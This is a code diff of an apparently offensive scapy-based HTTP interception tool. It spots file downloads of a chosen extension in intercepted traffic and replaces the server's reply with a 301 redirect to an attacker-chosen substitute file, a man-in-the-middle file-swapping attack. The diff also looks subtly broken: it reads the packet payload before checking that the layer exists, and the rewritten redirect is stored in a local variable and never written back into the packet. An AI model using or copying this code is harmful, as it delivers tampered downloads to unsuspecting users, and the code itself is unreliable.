@@ -65,17 +65,18 @@ def capture_packet(packet):
     global modified_file_path
     global ack_number
     scapy_packet = scapy.IP(packet.get_payload())
+    scapy_load = scapy_packet[2].load
     if scapy_packet.haslayer(scapy.Raw):
         try:   # raise Attribute error on interruption in connection or Browser is closed
             if scapy_packet[1].dport == 80:     #checking if packet has layer HTTP
                 print(Fore.LIGHTGREEN_EX + Style.BRIGHT + "[*]" + Fore.LIGHTWHITE_EX + Style.BRIGHT + " HTTP request packet")
-                if bytes(".{}".format(file_extension), encoding='utf-8') in scapy_packet[scapy.Raw].load:         #checking if there is file download in packet
+                if bytes(".{}".format(file_extension), encoding='utf-8') in scapy_load and modified_file_path not in scapy_load:         #checking if there is file download in packet
                     print(Fore.LIGHTBLUE_EX + Style.BRIGHT + "[+]" + Fore.LIGHTWHITE_EX + Style.BRIGHT + " File Intercepted")
                     ack_number += scapy_packet[1].ack            #Tracking ack number to identify packet
 
             elif scapy_packet[1].sport == 80:       #checking if packet has layer HTTP
                 if scapy_packet[1].seq == ack_number:
-                    scapy_packet[2].load = "HTTP/1.1 301 Moved Permanently\nLocation: {}\n\n".format(modified_file_path)
+                    scapy_load = "HTTP/1.1 301 Moved Permanently\nLocation: {}\n\n".format(modified_file_path)
                     del scapy_packet[scapy.IP].chksum  # avoiding chksum error for IP Layer
                     del scapy_packet[scapy.IP].len  # avoiding len error for IP Layer
                     del scapy_packet[scapy.TCP].chksum  # avoiding chksum error for UDP Layer
